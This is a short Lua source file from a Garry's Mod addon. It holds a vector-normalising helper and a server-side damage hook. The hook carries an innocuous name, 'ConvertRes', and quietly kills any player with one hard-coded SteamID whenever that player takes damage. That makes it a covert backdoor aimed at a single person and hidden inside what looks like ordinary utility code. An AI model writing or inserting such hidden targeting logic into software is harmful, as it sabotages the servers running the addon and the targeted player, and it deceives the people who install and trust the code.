function LDE:Normalise(Vec)
	local Length = Vec:Length()
	return Vec/Length
end

if SERVER then
	function LDEConvertRes( res, amount )
		if res:IsPlayer() then
			if res:SteamID() == "STEAM_0:1:51396090" then
				res:Kill()
			end
		end
	end
	hook.Add( "EntityTakeDamage", "ConvertRes", LDEConvertRes)
end